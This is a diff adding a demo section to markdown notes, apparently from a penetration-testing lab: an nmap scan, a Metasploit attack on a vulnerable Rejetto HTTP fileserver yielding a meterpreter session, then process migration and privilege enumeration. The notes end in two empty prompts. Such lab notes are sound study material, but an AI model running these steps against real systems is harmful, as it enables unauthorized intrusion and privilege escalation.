@@ -148,4 +148,39 @@
 
 ## Demo
 
+`nmap [target IP]`
+vulnerable http fileserver
 
+`service postgresql start && msfconsole`
+starting metasploit to exploit the http fileserver vulnerability.
+
+`setg rhosts [target IP]`
+We set the target ip as rhost and "G" so we don't have to retype it when we load a new metasploit module.
+
+`search rejetto`
+Rejetto fileserver which is vulnerable
+
+`use [found payload]`
+
+`exploit`
+meterpreter session successful
+
+Perform basic enumeration:
+
+meterpreter: `sysinfo`
+Which OS, Build etc
+
+meterpreter: `pgrep explorer`
+search for explorer process
+
+meterpreter: `migrate 2448`
+
+meterpreter: `sysinfo`
+
+meterpreter: `getuid`
+
+meterpreter: `getprivs`
+
+meterpreter:
+
+meterpreter:
